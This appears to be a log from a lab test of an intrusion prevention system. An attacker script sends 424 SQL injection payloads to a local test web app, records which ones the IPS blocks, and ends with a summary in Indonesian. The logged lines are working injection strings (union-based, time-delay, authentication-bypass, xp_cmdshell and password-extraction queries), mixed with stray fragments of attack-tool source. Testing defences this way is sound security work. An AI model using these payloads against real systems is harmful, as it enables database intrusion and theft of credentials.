+[276/424] %0d%0a';select @@version --                                  [DROP] BLOCKED/DROPPED (timeout)
+[277/424] ORDER BY 10#                                                 [DROP] BLOCKED/DROPPED (timeout)
+[278/424] and (select substring(@@version,2,1))='i'                    [DROP] BLOCKED/DROPPED (timeout)
+[279/424] ORDER BY 24--                                                [DROP] BLOCKED/DROPPED (timeout)
+[280/424] a' order by 9999#                                            [DROP] BLOCKED/DROPPED (timeout)
+[281/424] ORDER BY 3--                                                 [DROP] BLOCKED/DROPPED (timeout)
+[282/424] \n';select version() --                                      [DROP] BLOCKED/DROPPED (timeout)
+[283/424] \r\n;select @@version                                        [DROP] BLOCKED/DROPPED (timeout)
+[284/424] ORDER BY 2--                                                 [DROP] BLOCKED/DROPPED (timeout)
+[285/424] ORDER BY 16                                                  [WARN] HTTP 302
+[286/424] ORDER BY 16#                                                 [DROP] BLOCKED/DROPPED (timeout)
+[287/424] ORDER BY 27                                                  [WARN] HTTP 302
+[288/424] ORDER BY 25                                                  [WARN] HTTP 302
+[289/424] %0d%0a\';select version() --                                 [DROP] BLOCKED/DROPPED (timeout)
+[290/424] ORDER BY 4#                                                  [DROP] BLOCKED/DROPPED (timeout)
+[291/424] ORDER BY 2#                                                  [DROP] BLOCKED/DROPPED (timeout)
+[292/424] ORDER BY 1--                                                 [DROP] BLOCKED/DROPPED (timeout)
+[293/424] ORDER BY 28--                                                [DROP] BLOCKED/DROPPED (timeout)
+[294/424] ORDER BY 24#                                                 [DROP] BLOCKED/DROPPED (timeout)
+[295/424] \\r\\n';select @@version --                                  [DROP] BLOCKED/DROPPED (timeout)
+[296/424] ORDER BY 16--                                                [DROP] BLOCKED/DROPPED (timeout)
+[297/424] 1' ORDER BY 2--+                                             [DROP] BLOCKED/DROPPED (timeout)
+[298/424] ORDER BY 2                                                   [WARN] HTTP 302
+[299/424] 1,test-2.sqlite                                              [WARN] HTTP 302
+[300/424] badparams=`echo "$cleanoutput" | replace "$payload" "$numera [DROP] BLOCKED/DROPPED (timeout)
+[301/424] x' AND 1=(SELECT COUNT(*) FROM tabname); --                  [DROP] BLOCKED/DROPPED (timeout)
+[302/424] 4,run-423.sqlite                                             [WARN] HTTP 302
+[303/424] \r\n;select version from v$instance --                       [DROP] BLOCKED/DROPPED (timeout)
+[304/424] 4,run-134.sqlite                                             [WARN] HTTP 302
+[305/424] echo "  -e SQL delay injection"                              [DROP] BLOCKED/DROPPED (timeout)
+[306/424] while [[ $ahcount -le $maxxcount ]] ; do                     [WARN] HTTP 302
+[307/424] 7,db-setup.sqlite                                            [WARN] HTTP 302
+[308/424] '                                                            [DROP] BLOCKED/DROPPED (timeout)
+[309/424] 1,testcod-1000055.sqlite3                                    [WARN] HTTP 302
+[310/424] 4,run-907.sqlite                                             [WARN] HTTP 302
+[311/424] 4,run-259.sqlite                                             [WARN] HTTP 302
+[312/424] t'exec master..xp_cmdshell 'nslookup www.google.com'--       [DROP] BLOCKED/DROPPED (timeout)
+[313/424] %0d%0a union all select cast(dbms_pipe.receive_message(('a') [DROP] BLOCKED/DROPPED (timeout)
+[314/424] 1,padu-destination.sqlite                                    [WARN] HTTP 302
+[315/424] 4,run-377.sqlite                                             [WARN] HTTP 302
+[316/424] ' or ''&'                                                    [DROP] BLOCKED/DROPPED (timeout)
+[317/424] 4,run-530.sqlite                                             [WARN] HTTP 302
+[318/424] inputbuffer=`echo $inputbuffer | replace " " "/*d*/"`        [DROP] BLOCKED/DROPPED (timeout)
+[319/424] 8,run-97.sqlite                                              [WARN] HTTP 302
+[320/424] elif [[ "$xp" == "dualconditionalnumeric" ]] ; then          [DROP] BLOCKED/DROPPED (timeout)
+[321/424] 4,run-480.sqlite                                             [WARN] HTTP 302
+[322/424] 1' GROUP BY 1,2,--+                                          [DROP] BLOCKED/DROPPED (timeout)
+[323/424] self.log.error('Could not create SQLite database. Please try [DROP] BLOCKED/DROPPED (timeout)
+[324/424] 4,run-403.sqlite                                             [WARN] HTTP 302
+[325/424] if [[ "$status_true" != "$status_false" && "$status_true" == [DROP] BLOCKED/DROPPED (timeout)
+[326/424] length_false=`echo $response | cut -d ":" -f 2`              [DROP] BLOCKED/DROPPED (timeout)
+[327/424] a'||/**/456=678#                                             [DROP] BLOCKED/DROPPED (timeout)
+[328/424] ' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWOR [DROP] BLOCKED/DROPPED (timeout)
+[329/424] 4,run-326.sqlite                                             [WARN] HTTP 302
+[330/424] 4,run-338.sqlite                                             [WARN] HTTP 302
+[331/424] static=`echo $i | cut -d " " -f 2 | cut -d "?" -f 2`         [DROP] BLOCKED/DROPPED (timeout)
+[332/424] headertoset="$headertoadd"                                   [DROP] BLOCKED/DROPPED (timeout)
+[333/424] inurl:&#8221;games.php?id=                                   [DROP] BLOCKED/DROPPED (timeout)
+[334/424] 4,run-138.sqlite                                             [WARN] HTTP 302
+[335/424] ? ? ???-?-?-?!??                                    [WARN] HTTP 302
+[336/424] if [ $firstPOSTURIURL == 2 ] ; then #we want to fuzz the POS [DROP] BLOCKED/DROPPED (timeout)
+[337/424] J) # Filter Evasion nesting 'select' => 'selselectect'       [DROP] BLOCKED/DROPPED (timeout)
+[338/424] 10,run-18.sqlite                                             [WARN] HTTP 302
+[339/424] 4,run-430.sqlite                                             [WARN] HTTP 302
+[340/424] 4,run-921.sqlite                                             [WARN] HTTP 302
+[341/424] 1,oqmd-1514.sqlite3                                          [WARN] HTTP 302
+[342/424] 1,test-rel.sqlite3                                           [WARN] HTTP 302
+[343/424] tput sgr0 # Reset attributes.                                [DROP] BLOCKED/DROPPED (timeout)
+[344/424] badparams=`echo "$cleanoutput" | replace "$payload" "1/(case [DROP] BLOCKED/DROPPED (timeout)
+[345/424] %0d%0a\\' and 1337=dbms_pipe.receive_message(1,120) --       [DROP] BLOCKED/DROPPED (timeout)
+[346/424] echo "XPath element hierachy found at ./output/$safelogname. [DROP] BLOCKED/DROPPED (timeout)
+[347/424] echo "POST" $outer"???"$mparams                              [DROP] BLOCKED/DROPPED (timeout)
+[348/424] nullwrongstring=$nullwrongstring"null"                       [DROP] BLOCKED/DROPPED (timeout)
+[349/424] while [[ $attgcount -le $maxxcount ]] ; do                   [WARN] HTTP 302
+[350/424] if [[ $timediff -gt 3 || $timediff -lt -3 ]] ; then          [WARN] HTTP 302
+[351/424] 4,run-850.sqlite                                             [WARN] HTTP 302
+[352/424] ' or uname like '%                                           [DROP] BLOCKED/DROPPED (timeout)
+[353/424] 4,run-967.sqlite                                             [WARN] HTTP 302
+[354/424] 4,run-307.sqlite                                             [WARN] HTTP 302
+[355/424] create user name identified by 'pass123'                     [DROP] BLOCKED/DROPPED (timeout)
+[356/424] " or "" "                                                    [DROP] BLOCKED/DROPPED (timeout)
+[357/424] 4,run-779.sqlite                                             [WARN] HTTP 302
+[358/424] or '7659'='7659                                              [DROP] BLOCKED/DROPPED (timeout)
+[359/424] 4,run-102.sqlite                                             [WARN] HTTP 302
+[360/424] )) and 0=benchmark(3000000,MD5(1))%20--                      [DROP] BLOCKED/DROPPED (timeout)
+[361/424] stringofparams=`echo $params | tr "&" " "`                   [DROP] BLOCKED/DROPPED (timeout)
+[362/424] if [[ "$status1" != "200" && "$status1" == "$status999" && " [DROP] BLOCKED/DROPPED (timeout)
+[363/424] iu=".child node: ---"                                        [DROP] BLOCKED/DROPPED (timeout)
+[364/424] if [ true = "$Z" ] ; then echo "DEBUG! encoder input: $input [DROP] BLOCKED/DROPPED (timeout)
+[365/424] ((lendiff=$lengthselY-$lengthselN))                          [WARN] HTTP 302
+[366/424] 4,run-590.sqlite                                             [WARN] HTTP 302
+[367/424] 8,run-59.sqlite                                              [WARN] HTTP 302
+[368/424] echo -e '\E[31;48m'"\033[1m[TIME-DELAY-"$time_diff"SEC $dbms [DROP] BLOCKED/DROPPED (timeout)
+[369/424] \\' or \\'xyz\\'=\\'xyz\\' --                                [DROP] BLOCKED/DROPPED (timeout)
+[370/424] 4,run-726.sqlite                                             [WARN] HTTP 302
+[371/424] echo "Some examples are: -s, -n, -q, -r, -e, -b, -C" >&2     [DROP] BLOCKED/DROPPED (timeout)
+[372/424] 1,safari-partial.sqlite                                      [WARN] HTTP 302
+[373/424] 8,run-22.sqlite                                              [WARN] HTTP 302
+[374/424] admin" or "1"="1                                             [DROP] BLOCKED/DROPPED (timeout)
+[375/424] \\n\\' or 1337=dbms_pipe.receive_message(1,120) --           [DROP] BLOCKED/DROPPED (timeout)
+[376/424] ' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(U [DROP] BLOCKED/DROPPED (timeout)
+[377/424] elif [[ $dbms == "oracle" ]] ; then                          [DROP] BLOCKED/DROPPED (timeout)
+[378/424] echo -n "$char" >> ./listofxpathelements.txt                 [DROP] BLOCKED/DROPPED (timeout)
+[379/424] 8,run-86.sqlite                                              [WARN] HTTP 302
+[380/424] ???'??ƥ???m?/ܩ??%d?"Ռ(d?2?E?A??(????'???+? ύ??B???? [DROP] BLOCKED/DROPPED (timeout)
+[381/424] 1,storage-sync.sqlite                                        [WARN] HTTP 302
+[382/424] " or "a"="a                                                  [DROP] BLOCKED/DROPPED (timeout)
+[383/424] " or ""&"                                                    [DROP] BLOCKED/DROPPED (timeout)
+[384/424] %0d%0a and 1337=dbms_pipe.receive_message(('a'),120)         [DROP] BLOCKED/DROPPED (timeout)
+[385/424] ')) and 0=benchmark(3000000,MD5(1)) #                        [DROP] BLOCKED/DROPPED (timeout)
+[386/424] \\r\\n;select case when 20=20 then 'a'||dbms_pipe.receive_me [DROP] BLOCKED/DROPPED (timeout)
+[387/424] )%20or%20('x'='x                                             [DROP] BLOCKED/DROPPED (timeout)
+[388/424] )) and 0=benchmark(3000000,MD5(1)) #                         [DROP] BLOCKED/DROPPED (timeout)
+[389/424] if [[ true = "$n" || true = "$s" || true = "$e" || true = "$ [DROP] BLOCKED/DROPPED (timeout)
+[390/424] ; exec ('sel' + 'ect us' + 'er')                             [DROP] BLOCKED/DROPPED (timeout)
+[391/424] 4,run-111.sqlite                                             [WARN] HTTP 302
+[392/424] 4,run-608.sqlite                                             [WARN] HTTP 302
+[393/424] 4,run-459.sqlite                                             [WARN] HTTP 302
+[394/424] 1,bio-fake.sqlite3                                           [WARN] HTTP 302
+[395/424] ';                                                           [DROP] BLOCKED/DROPPED (timeout)
+[396/424] echo "Attempting to brute force $findme. If you get bored hi [DROP] BLOCKED/DROPPED (timeout)
+[397/424] 1,-sqlite.sqlite3                                            [WARN] HTTP 302
+[398/424] admin' or '1'='1'--                                          [DROP] BLOCKED/DROPPED (timeout)
+[399/424] echo "[ORDER BY: $colno COL REQ:$K] $request" >> ./output/$s [DROP] BLOCKED/DROPPED (timeout)
+[400/424] 4,run-623.sqlite                                             [WARN] HTTP 302
+[401/424] if [[ $oflag == "1" ]] ; then #this routine gets run once at [DROP] BLOCKED/DROPPED (timeout)
+[402/424] 8,run-25.sqlite                                              [WARN] HTTP 302
+[403/424] 1,db-PORT-ZOMPARELLI.sqlite3                                 [WARN] HTTP 302
+[404/424] ' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(c [DROP] BLOCKED/DROPPED (timeout)
+[405/424] /**/                                                         [DROP] BLOCKED/DROPPED (timeout)
+[406/424] 6,token-version-1.5.sqlite                                   [WARN] HTTP 302
+[407/424] if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then            [WARN] HTTP 302
+[408/424] 4,run-425.sqlite                                             [WARN] HTTP 302
+[409/424] rbuff="/*[$xcount]"                                          [DROP] BLOCKED/DROPPED (timeout)
+[410/424] 4,run-555.sqlite                                             [WARN] HTTP 302
+[411/424] ') or ('x')=('x                                              [DROP] BLOCKED/DROPPED (timeout)
+[412/424] p) # hash + noise + newline                                  [DROP] BLOCKED/DROPPED (timeout)
+[413/424] ' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_ [DROP] BLOCKED/DROPPED (timeout)
+[414/424] quote="'"                                                    [DROP] BLOCKED/DROPPED (timeout)
+[415/424] 1,pi-ager.sqlite3                                            [WARN] HTTP 302
+[416/424] ')) or benchmark(10000000,MD5(1))#                           [DROP] BLOCKED/DROPPED (timeout)
+[417/424] \n' or 1337=dbms_pipe.receive_message(1,120) --              [DROP] BLOCKED/DROPPED (timeout)
+[418/424] or 1/*                                                       [DROP] BLOCKED/DROPPED (timeout)
+[419/424] '),(select if(count(*)!=-1,benchmark(3000000,MD5(1)),benchma [DROP] BLOCKED/DROPPED (timeout)
+[420/424] stringlength=${#uriinputdecode}                              [DROP] BLOCKED/DROPPED (timeout)
+[421/424] xp="conditionalstring"                                       [DROP] BLOCKED/DROPPED (timeout)
+[422/424] 1,tub-bourg.sqlite3                                          [WARN] HTTP 302
+
+--------------------------------------------------------
+  RINGKASAN SERANGAN:
+  Total Payload Dikirim : 422
+  Diblokir (DROP/timeout): 357
+  Lolos ke server       : 65
+--------------------------------------------------------
+
+[LOG] Logging dimulai: 2026-07-04 08:24:48
+[LOG] File log: /home/ubuntu/Documents/HNIPS_project/runner_scripts/saved_logs/attacker/log-nomor 1_send_attack.txt
+
+========================================================
+  NODE ATTACKER: SEND ATTACK (SQLi Payloads)
+========================================================
+  Target  : http://172.17.0.2/vulnerabilities/sqli/
+  File    : /home/ubuntu/Documents/HNIPS_project/sqli_payloads.txt
+  Payloads: 424
+  Cookie  : PHPSESSID=pgdrle5m5kd2rdvs9rbp8u6il6; se...
+========================================================
+
+  Format output:
+  -> Menampilkan payload yang dikirim
+  -> HTTP Status Code respons dari server
+  (Status 000/timeout = paket di-DROP oleh IPS)
+
+========================================================
+[  1/424] \\n union all select 1337,1337,1337,1337,1337,1337,1337,1337 [WARN] HTTP 302
+[  2/424] 0x00' union all select cast(pg_sleep(120) as integer),null,n [DROP] BLOCKED/DROPPED (timeout)
+[  3/424] %0d%0a\\' union all select cast(pg_sleep(120) as integer),nu [DROP] BLOCKED/DROPPED (timeout)
+[  4/424] %0d%0a union all select '1337','1337','1337','1337' waitfor  [WARN] HTTP 302
+[  5/424] %00\' union all select cast(pg_sleep(120) as integer),null,n [DROP] BLOCKED/DROPPED (timeout)
+[  6/424] 0x0a\\' union all select sleep(120),1337,1337,1337 --        [WARN] HTTP 302
+[  7/424] \\n' union all select cast(pg_sleep(120) as integer),'1337', [DROP] BLOCKED/DROPPED (timeout)
+[  8/424] 0x00\' union all select sleep(120),null,null --              [WARN] HTTP 302
+[  9/424] \r\n\' union all select 1337,1337,1337,1337 waitfor delay \' [WARN] HTTP 302
+[ 10/424] %0a\' union all select cast(pg_sleep(120) as text),'1337','1 [DROP] BLOCKED/DROPPED (timeout)
+[ 11/424] %00 union all select cast(pg_sleep(120) as text),null,null,n [DROP] BLOCKED/DROPPED (timeout)
+[ 12/424] 0x0a\\' union all select (select 1337 from pg_sleep(120)),nu [WARN] HTTP 302
+[ 13/424] 0x0a' union all select sleep(120),1337,1337,1337,1337,1337,1 [WARN] HTTP 302
+[ 14/424] %0a union all select sleep(120),null,null,null,null,null,nul [WARN] HTTP 302
+[ 15/424] \r\n\' union all select sleep(120),1337,1337,1337,1337,1337, [WARN] HTTP 302
+[ 16/424] \\r\\n\\' union all select cast(pg_sleep(120) as text),1337, [DROP] BLOCKED/DROPPED (timeout)
+[ 17/424] %0d%0a union all select cast(pg_sleep(120) as integer),'1337 [DROP] BLOCKED/DROPPED (timeout)
+[ 18/424] \\' union all select cast(pg_sleep(120) as integer),1337,133 [DROP] BLOCKED/DROPPED (timeout)
+[ 19/424] UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000 [WARN] HTTP 302
+[ 20/424] \r\n union all select sleep(120),null,null,null,null --      [WARN] HTTP 302
+[ 21/424] %0a and 1337=(select 1337 from (select sleep(120))A) --      [DROP] BLOCKED/DROPPED (timeout)
+[ 22/424] %0a waitfor delay '00:02'                                    [WARN] HTTP 302
+[ 23/424] 0x00\' union all select (select 1337 from pg_sleep(120)),nul [WARN] HTTP 302
+[ 24/424] \\n\\' union all select cast(pg_sleep(120) as integer),1337, [DROP] BLOCKED/DROPPED (timeout)
+[ 25/424] %0a union all select sleep(120) --                           [WARN] HTTP 302
+[ 26/424] %00 union all select sleep(120)                              [WARN] HTTP 302
+[ 27/424] %0d%0a union all select (select 1337 from pg_sleep(120)),nul [WARN] HTTP 302
+[ 28/424] ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9, [DROP] BLOCKED/DROPPED (timeout)
+[ 29/424] \\r\\n\\' and 1337=(select 1337 from pg_sleep(120)) --       [DROP] BLOCKED/DROPPED (timeout)
+[ 30/424] ' union all select cast(pg_sleep(120) as text),1337 --       [DROP] BLOCKED/DROPPED (timeout)
+[ 31/424] 0x00\' union all select cast(pg_sleep(120) as text),1337,133 [DROP] BLOCKED/DROPPED (timeout)
+[ 32/424] )) waitfor delay '0:0:__TIME__' /*                           [WARN] HTTP 302
+[ 33/424] \\n' union all select cast(pg_sleep(120) as text),null,null, [DROP] BLOCKED/DROPPED (timeout)
+[ 34/424] 0x0d0a union all select null,null,null,null,null,null,null,n [WARN] HTTP 302
+[ 35/424] \\r\\n union all select 1337,1337,1337,1337,1337,1337 waitfo [WARN] HTTP 302
+[ 36/424] 0x00\\' union all select cast(pg_sleep(120) as text),'1337', [DROP] BLOCKED/DROPPED (timeout)
+[ 37/424] 0x00\\' union all select cast(pg_sleep(120) as integer),null [DROP] BLOCKED/DROPPED (timeout)
+[ 38/424] 0x00;select pg_sleep(120)                                    [WARN] HTTP 302
+[ 39/424] %0a union all select cast(pg_sleep(120) as integer),1337,133 [DROP] BLOCKED/DROPPED (timeout)
+[ 40/424] \n' union all select cast(pg_sleep(120) as integer),1337,133 [DROP] BLOCKED/DROPPED (timeout)
+[ 41/424] %00 union all select cast(dbms_pipe.receive_message((\'a\'), [DROP] BLOCKED/DROPPED (timeout)
+[ 42/424] \r\n union all select '1337','1337','1337' from dual         [WARN] HTTP 302
+[ 43/424] %0a' union all select cast(dbms_pipe.receive_message(1,120)  [DROP] BLOCKED/DROPPED (timeout)
+[ 44/424] 0x0a' union all select cast(dbms_pipe.receive_message(('a'), [DROP] BLOCKED/DROPPED (timeout)
+[ 45/424] \\n union all select cast(dbms_pipe.receive_message((\'a\'), [DROP] BLOCKED/DROPPED (timeout)
+[ 46/424] %0d%0a' union all select cast(dbms_pipe.receive_message(('a' [DROP] BLOCKED/DROPPED (timeout)
+[ 47/424] %0a union all select dbms_pipe.receive_message(1,120),1337,1 [DROP] BLOCKED/DROPPED (timeout)
+[ 48/424] %0a union all select null,null from dual --                  [WARN] HTTP 302
+[ 49/424] %00\' union all select '1337','1337','1337','1337','1337','1 [WARN] HTTP 302
+[ 50/424] 0x0a' union all select cast(dbms_pipe.receive_message(1,120) [DROP] BLOCKED/DROPPED (timeout)
+[ 51/424] 0x0d0a union all select 1337,1337,1337,1337,1337,1337,1337,1 [WARN] HTTP 302
+[ 52/424] \n union all select cast(dbms_pipe.receive_message(('a'),120 [DROP] BLOCKED/DROPPED (timeout)
+[ 53/424] 0x0a' union all select dbms_pipe.receive_message(('a'),120), [WARN] HTTP 302
+[ 54/424] \n union all select dbms_pipe.receive_message((\'a\'),120),n [WARN] HTTP 302
+[ 55/424] %0d%0a union all select dbms_pipe.receive_message((\'a\'),12 [WARN] HTTP 302
+[ 56/424] \n union all select cast(dbms_pipe.receive_message(1,120) as [DROP] BLOCKED/DROPPED (timeout)
+[ 57/424] \n union all select cast(dbms_pipe.receive_message((\'a\'),1 [DROP] BLOCKED/DROPPED (timeout)
+[ 58/424] \\n' union all select dbms_pipe.receive_message(1,120),null, [DROP] BLOCKED/DROPPED (timeout)
+[ 59/424] \\n\\' union all select cast(dbms_pipe.receive_message((\\'a [DROP] BLOCKED/DROPPED (timeout)
+[ 60/424] \\r\\n' union all select cast(dbms_pipe.receive_message(('a' [DROP] BLOCKED/DROPPED (timeout)
+[ 61/424] union all select cast(dbms_pipe.receive_message(1,120) as in [DROP] BLOCKED/DROPPED (timeout)
+[ 62/424] \\r\\n' union all select dbms_pipe.receive_message(('a'),120 [WARN] HTTP 302
+[ 63/424] \\n union all select cast(dbms_pipe.receive_message(1,120) a [DROP] BLOCKED/DROPPED (timeout)
+[ 64/424] 0x00\' union all select null,null,null,null,null,null --     [WARN] HTTP 302
+[ 65/424] \r\n union all select cast(dbms_pipe.receive_message(('a'),1 [DROP] BLOCKED/DROPPED (timeout)
+[ 66/424] union all select cast(dbms_pipe.receive_message(1,120) as in [DROP] BLOCKED/DROPPED (timeout)
+[ 67/424] \r\n' union all select 1337,1337,1337,1337,1337,1337,1337,13 [WARN] HTTP 302
+[ 68/424] \r\n union all select cast(dbms_pipe.receive_message(1,120)  [DROP] BLOCKED/DROPPED (timeout)
+[ 69/424] %0d%0a union all select dbms_pipe.receive_message(('a'),120) [WARN] HTTP 302
+[ 70/424] \n union all select cast(dbms_pipe.receive_message((\'a\'),1 [DROP] BLOCKED/DROPPED (timeout)
+[ 71/424] \r\n\' union all select cast(dbms_pipe.receive_message(1,120 [DROP] BLOCKED/DROPPED (timeout)
+[ 72/424] %00' union all select 1337,1337,1337 from dual --            [WARN] HTTP 302
+[ 73/424] \n union all select dbms_pipe.receive_message(1,120),'1337', [DROP] BLOCKED/DROPPED (timeout)
+[ 74/424] 0x00\\' union all select dbms_pipe.receive_message(1,120),nu [DROP] BLOCKED/DROPPED (timeout)
+[ 75/424] 0x00 union all select cast(dbms_pipe.receive_message(('a'),1 [DROP] BLOCKED/DROPPED (timeout)
+[ 76/424] 0x0d0a' union all select cast(dbms_pipe.receive_message(1,12 [DROP] BLOCKED/DROPPED (timeout)
+[ 77/424] 0x0d0a\' union all select cast(dbms_pipe.receive_message(1,1 [DROP] BLOCKED/DROPPED (timeout)
+[ 78/424] ' union all select '1337','1337','1337','1337','1337','1337' [WARN] HTTP 302
+[ 79/424] UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,1 [WARN] HTTP 302
+[ 80/424] 0x00\\' union all select null,null from dual --              [WARN] HTTP 302
+[ 81/424] \r\n union all select cast(dbms_pipe.receive_message(('a'),1 [DROP] BLOCKED/DROPPED (timeout)
+[ 82/424] union all select 1337,1337,1337 --                           [WARN] HTTP 302
+[ 83/424] 0x0d0a\\' union all select cast(dbms_pipe.receive_message((\ [DROP] BLOCKED/DROPPED (timeout)
+[ 84/424] 0x0a union all select cast(dbms_pipe.receive_message(1,120)  [DROP] BLOCKED/DROPPED (timeout)
+[ 85/424] union all select dbms_pipe.receive_message(('a'),120),'1337' [WARN] HTTP 302
+[ 86/424] 0x00\\' union all select cast(dbms_pipe.receive_message(1,12 [DROP] BLOCKED/DROPPED (timeout)
+[ 87/424] %0d%0a union all select cast(dbms_pipe.receive_message(('a') [DROP] BLOCKED/DROPPED (timeout)
+[ 88/424] 0x0a union all select '1337','1337','1337','1337','1337','13 [WARN] HTTP 302
+[ 89/424] \\n\\' union all select cast(dbms_pipe.receive_message((\\'a [DROP] BLOCKED/DROPPED (timeout)
+[ 90/424] \\n' union all select null,null,null,null --                 [WARN] HTTP 302
+[ 91/424] 0x00' union all select dbms_pipe.receive_message(1,120),null [DROP] BLOCKED/DROPPED (timeout)
+[ 92/424] \r\n union all select cast(dbms_pipe.receive_message((\'a\') [DROP] BLOCKED/DROPPED (timeout)
+[ 93/424] \n union all select dbms_pipe.receive_message((\'a\'),120),' [WARN] HTTP 302
+[ 94/424] %0a union all select cast(dbms_pipe.receive_message((\'a\'), [DROP] BLOCKED/DROPPED (timeout)
+[ 95/424] \\r\\n union all select dbms_pipe.receive_message(('a'),120) [WARN] HTTP 302
+[ 96/424] \r\n' union all select cast(dbms_pipe.receive_message(('a'), [DROP] BLOCKED/DROPPED (timeout)
+[ 97/424] 0x0d0a\\' union all select '1337','1337','1337','1337','1337 [WARN] HTTP 302
+[ 98/424] 0x0d0a\\' union all select cast(dbms_pipe.receive_message(1, [DROP] BLOCKED/DROPPED (timeout)
+[ 99/424] \r\n union all select cast(dbms_pipe.receive_message(1,120)  [DROP] BLOCKED/DROPPED (timeout)
+[100/424] union all select '1337','1337','1337','1337','1337','1337',' [WARN] HTTP 302
+[101/424] root' or 1=1--                                               [WARN] HTTP 302
+[102/424] AND 7506=9091 AND (5913=5913                                 [WARN] HTTP 302
+[103/424] root" or 1=1                                                 [WARN] HTTP 302
+[104/424] root'or 1=1 or ''='                                          [WARN] HTTP 302
+[105/424] AND 7300=7300 AND ('pKlZ'='pKlZ                              [WARN] HTTP 302
+[106/424] or 1=1--                                                     [WARN] HTTP 302
+[107/424] AND 1=0 AND '%'='                                            [WARN] HTTP 302
+[108/424] AS INJECTX WHERE 1=1 AND 1=0#                                [DROP] BLOCKED/DROPPED (timeout)
+[109/424] 2 and 456=678                                                [WARN] HTTP 302
+[110/424] hi or 1=1 --"                                                [WARN] HTTP 302
+[111/424] OR 1=0--                                                     [WARN] HTTP 302
+[112/424] 0x00 or 20=20                                                [WARN] HTTP 302
+[113/424] WHERE 1=1 AND 1=0#                                           [DROP] BLOCKED/DROPPED (timeout)
+[114/424] OR 3409=3409 AND ('pytW' LIKE 'pytY                          [DROP] BLOCKED/DROPPED (timeout)
+[115/424] AND 7300=7300 AND ('pKlZ'='pKlY                              [WARN] HTTP 302
+[116/424] AND 7506=9091 AND ('5913=5913                                [WARN] HTTP 302
+[117/424] badparams=`echo "$cleanoutput" | replace "$payload" "a\" or  [DROP] BLOCKED/DROPPED (timeout)
+[118/424] badparams=`echo "$cleanoutput" | replace "$payload" "a' or 7 [DROP] BLOCKED/DROPPED (timeout)
+[119/424] AND 1=1                                                      [WARN] HTTP 302
+[120/424] or 1=1 /*                                                    [WARN] HTTP 302
+[121/424] admin" or 1=1#                                               [WARN] HTTP 302
+[122/424] OR 1=1#                                                      [WARN] HTTP 302
+[123/424] WHERE 1=1 AND 1=1                                            [DROP] BLOCKED/DROPPED (timeout)
+[124/424] AND 1=1                                                      [WARN] HTTP 302
+[125/424] or 20=20                                                     [WARN] HTTP 302
+[126/424] root' or 1=1/*                                               [WARN] HTTP 302
+[127/424] 0x0d0a\\' or 20=20 --                                        [DROP] BLOCKED/DROPPED (timeout)
+[128/424] \\n' or 20=20 --                                             [DROP] BLOCKED/DROPPED (timeout)
+[129/424] 23 or 1=1; --                                                [WARN] HTTP 302
+[130/424] AS INJECTX WHERE 1=1 AND 1=0                                 [DROP] BLOCKED/DROPPED (timeout)
+[131/424] %0d%0a\\' or 20=20 --                                        [DROP] BLOCKED/DROPPED (timeout)
+[132/424] AS INJECTX WHERE 1=1 AND 1=1#                                [DROP] BLOCKED/DROPPED (timeout)
+[133/424] ‘ or 1=1 --                                                [WARN] HTTP 302
+[134/424] \\r\\n or 20=20                                              [WARN] HTTP 302
+[135/424] or 1=1 /*                                                    [WARN] HTTP 302
+[136/424] OR 1=1--                                                     [WARN] HTTP 302
+[137/424] OR 1=1#                                                      [WARN] HTTP 302
+[138/424] AS INJECTX WHERE 1=1 AND 1=1#                                [DROP] BLOCKED/DROPPED (timeout)
+[139/424] " or 1=1                                                     [WARN] HTTP 302
+[140/424] or 0=0 --                                                    [DROP] BLOCKED/DROPPED (timeout)
+[141/424] ' or 3=3 --                                                  [DROP] BLOCKED/DROPPED (timeout)
+[142/424] or 1=1--                                                     [WARN] HTTP 302
+[143/424] or%201=1 --                                                  [WARN] HTTP 302
+[144/424] a" or 1=1--                                                  [WARN] HTTP 302
+[145/424] or 1=1/*                                                     [WARN] HTTP 302
+[146/424] admin" or 1=1/*                                              [WARN] HTTP 302
+[147/424] \' or 20=20 --                                               [DROP] BLOCKED/DROPPED (timeout)
+[148/424] AS INJECTX WHERE 1=1 AND 1=1                                 [DROP] BLOCKED/DROPPED (timeout)
+[149/424] %0a\' or 20=20 --                                            [DROP] BLOCKED/DROPPED (timeout)
+[150/424] ' or 0=0 --                                                  [DROP] BLOCKED/DROPPED (timeout)
+[151/424] \n' or 20=20 --                                              [DROP] BLOCKED/DROPPED (timeout)
+[152/424] %0a or 20=20                                                 [WARN] HTTP 302
+[153/424] AND 7300=7300 AND 'pKlZ'='pKlY                               [WARN] HTTP 302
+[154/424] WHERE 1=1 AND 1=1--                                          [DROP] BLOCKED/DROPPED (timeout)
+[155/424] AND 1083=1083 AND ('1427=1427                                [WARN] HTTP 302
+[156/424] badparams=`echo "$cleanoutput" | replace "$payload" "a\" or  [DROP] BLOCKED/DROPPED (timeout)
+[157/424] " or 1=1--                                                   [WARN] HTTP 302
+[158/424] OR 1=0#                                                      [WARN] HTTP 302
+[159/424] ' or 1=1 --                                                  [WARN] HTTP 302
+[160/424] AND 1=1 AND '%'='                                            [WARN] HTTP 302
+[161/424] a' or 3=3--                                                  [DROP] BLOCKED/DROPPED (timeout)
+[162/424] \n or 20=20                                                  [WARN] HTTP 302
+[163/424] \\r\\n' or 20=20 --                                          [DROP] BLOCKED/DROPPED (timeout)
+[164/424] AND 1=1 AND '%'='                                            [WARN] HTTP 302
+[165/424] or 1=1#                                                      [WARN] HTTP 302
+[166/424] 0x0a' or 20=20 --                                            [DROP] BLOCKED/DROPPED (timeout)
+[167/424] %00' or 20=20 --                                             [DROP] BLOCKED/DROPPED (timeout)
+[168/424] ' and 1=0) union all                                         [DROP] BLOCKED/DROPPED (timeout)
+[169/424] %00\' or 20=20 --                                            [DROP] BLOCKED/DROPPED (timeout)
+[170/424] badparams=`echo "$cleanoutput" | replace "$payload" "%33%34% [DROP] BLOCKED/DROPPED (timeout)
+[171/424] obuff=$obuff"%2f%2a%5b%31%5d"                                [DROP] BLOCKED/DROPPED (timeout)
